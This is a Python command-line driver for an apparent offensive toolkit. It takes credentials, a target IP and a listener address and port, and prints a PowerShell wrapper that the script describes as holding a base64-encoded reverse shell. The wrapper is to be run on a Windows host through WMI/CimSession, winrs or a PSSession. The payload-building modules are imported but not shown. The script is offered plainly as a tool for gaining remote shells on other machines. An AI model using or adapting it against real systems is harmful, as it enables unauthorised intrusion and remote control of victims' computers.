#!/usr/bin/python3
import argparse
from textwrap import dedent
from cimsession import CimSession
from winrs import Winrs
from pssession import PSSession

def main():
    parser = argparse.ArgumentParser(
        description="Print a PowerShell wrapper holding a base64-encoded reverse shell."
    )
    parser.add_argument("-username", required=True, help="Username for PSCredential")
    parser.add_argument("-password", required=True, help="Password for PSCredential")
    parser.add_argument("-target_ip", required=True, help="Target IP for CimSession")
    parser.add_argument("-listen_address", required=True, help="IP address to connect back to")
    parser.add_argument("-listen_port", required=True, type=int, help="Port to connect back on")
    parser.add_argument("-cimsession", action="store_true", help="Utilize WMI PowerShell")
    parser.add_argument("-winrs", action="store_true", help="Utilize winrs command line application")
    parser.add_argument("-pssession", action="store_true", help="Utilize a PSSession")

    args = parser.parse_args()

    # Find all arguments that were defined as booleans
    bool_flags = [
        value for key, value in vars(args).items()
        if isinstance(value, bool)
    ]

    if not any(bool_flags):
        parser.error("At Least one of connection method must be specified")

    if args.cimsession:
        connection = CimSession
    elif args.winrs:
        connection = Winrs
    elif args.pssession:
        connection = PSSession

    print(connection.get_ps(
                username=args.username,
                password=args.password,
                target_ip=args.target_ip,
                listen_address=args.listen_address,
                listen_port=args.listen_port))

if __name__ == "__main__":
    main()
